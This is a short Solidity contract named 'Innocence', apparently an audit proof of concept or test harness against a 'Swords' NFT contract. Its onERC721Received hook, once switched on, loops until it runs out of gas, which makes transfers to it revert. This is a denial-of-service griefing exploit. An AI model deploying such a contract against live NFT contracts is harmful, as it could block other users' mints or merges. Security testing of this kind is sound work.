// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./swords.sol";

contract Innocence is IERC721Receiver {

    Swords private target;
    bool private blockingSwitch; 

    constructor(address payable t) {
        target = Swords(t);
    }
    function turnOn() external {
        blockingSwitch = true;
    }
    function mint(uint256 numberOfTokens) external payable
    {
        target.mint{value: msg.value}(numberOfTokens);
    }
    function mergeNFTs(uint256[] calldata tokenIds) external
    {
        target.mergeNFTs(tokenIds);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        uint i; 
        if (blockingSwitch)
            while(true) { //practical unoptimizable forever loop
                i++; 
                if (i == type(uint).max) break; }
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}